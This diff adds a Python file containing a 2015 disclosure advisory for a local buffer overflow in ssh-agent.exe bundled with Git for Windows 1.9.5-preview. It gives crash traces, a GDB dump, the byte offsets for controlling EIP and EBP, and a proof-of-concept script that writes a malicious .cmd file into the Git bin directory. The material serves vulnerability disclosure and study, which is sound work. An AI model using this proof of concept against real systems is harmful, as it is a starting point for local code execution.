@@ -1,0 +1,147 @@
+'''
+[+] Credits: hyp3rlinx
+
+[+] Website: hyp3rlinx.altervista.org
+
+[+] Source:  http://hyp3rlinx.altervista.org/advisories/AS-GIT-SSH-AGENT-BUFF-OVERFLOW.txt
+
+
+
+Vendor:
+================================
+git-scm.com
+
+
+
+Product:
+================================
+Git-1.9.5-preview20150319.exe
+github.com/msysgit/msysgit/releases/tag/Git-1.9.5-preview20150319
+
+
+Vulnerability Type:
+===================
+Buffer Overflow
+
+
+
+CVE Reference:
+==============
+N/A
+
+
+
+Vulnerability Details:
+=========================
+Git Windows SVN ssh-agent.exe is vulnerable to buffer overflow. Under cmd dir in Git there is
+start-ssh-agent.cmd file used to invoke ssh-agent.exe. This is local attack vector in which if
+the "start-ssh-agent.cmd" file is replaced with specially crafted malicious '.cmd' file we cause buffer overflow, code execution may become possible.
+
+Fault module seems to be msys-1.0.dll
+
+File Name: msys-1.0.dll
+MD5: 39E779952FF35D1EB3F74B9C36739092
+APIVersion: 0.46
+
+Stack trace:
+-------------
+MSYS-1.0.12 Build:2012-07-05 14:56
+Exception: STATUS_ACCESS_VIOLATION at eip=41414141
+eax=FFFFFFFF ebx=0028FA3C ecx=680A4C3A edx=680A4C3A esi=0028FA2C edi=00001DAC
+ebp=42424242 esp=0028F9B4 program=C:\Program Files (x86)\Git\bin\ssh-agent.exe
+cs=0023 ds=002B es=002B fs=0053 gs=002B ss=002B
+
+
+Payload of 944 bytes to cause seg fault:
+@ 948 bytes we completely overwrite EBP register.
+@ 972 bytes KABOOOOOOOOOOM! we control EIP.
+
+
+Quick GDB dump...
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) info r
+eax            0xffffffff       -1
+ecx            0x680a4c3a       1745505338
+edx            0x680a4c3a       1745505338
+ebx            0x28f90c 2685196
+esp            0x28f884 0x28f884
+ebp            0x41414141       0x41414141
+esi            0x28f8fc 2685180
+edi            0x2660   9824
+eip            0x41414141       0x41414141
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x23     35
+ss             0x2b     43
+ds             0x2b     43
+es             0x2b     43
+fs             0x53     83
+gs             0x2b     43
+
+
+
+POC code(s):
+===============
+
+Python script below to create a malicious 'start-ssh-agent.cmd' file that will be renamed
+to 'ssh_agent_hell.cmd' and moved to the Git/bin directory, once run will cause buffer overflow and overwrite EIP.
+
+Save following as ssh-agent-eip.py or whatever, run the script to generate a new malicious '.cmd' file and run it!
+
+'''
+
+import struct,os,shutil
+
+#Git ssh-agent.exe
+#EIP overwrite at 972 bytes
+#By hyp3rlinx
+#======================================================
+
+file="C:\\Program Files (x86)\\Git\\bin\\ssh_agent_hell"
+payload="CALL ssh-agent.exe "
+
+x=open(file,"w")
+
+eip="A"*4
+payload+="B"*968+eip
+x.write(payload)
+x.close()
+src="C:\\Program Files (x86)\\Git\\bin\\"
+shutil.move(file,file+".cmd")
+
+
+print "Git ssh-agent.exe buffer overflow POC\n"
+print "ssh_agent_hell.cmd file created!...\n"
+print "by hyp3rlinx"
+print "====================================\n"
+
+'''
+Disclosure Timeline:
+=========================================================
+Vendor Notification:  August 10, 2015
+Sept 26, 2015  : Public Disclosure
+
+
+
+
+Exploitation Technique:
+=======================
+Local
+
+
+
+Description:
+==========================================================
+Vulnerable Product:     [+]  Git-1.9.5-preview20150319.exe
+
+
+
+===========================================================
+
+[+] Disclaimer
+Permission is hereby granted for the redistribution of this advisory, provided that it is not altered except by reformatting it, and that due credit is given. Permission is explicitly given for insertion in vulnerability databases and similar, provided that due credit is given to the author.
+The author is not responsible for any misuse of the information contained herein and prohibits any malicious use of all security related information or exploits by the author or elsewhere.
+
+by hyp3rlinx
+'''
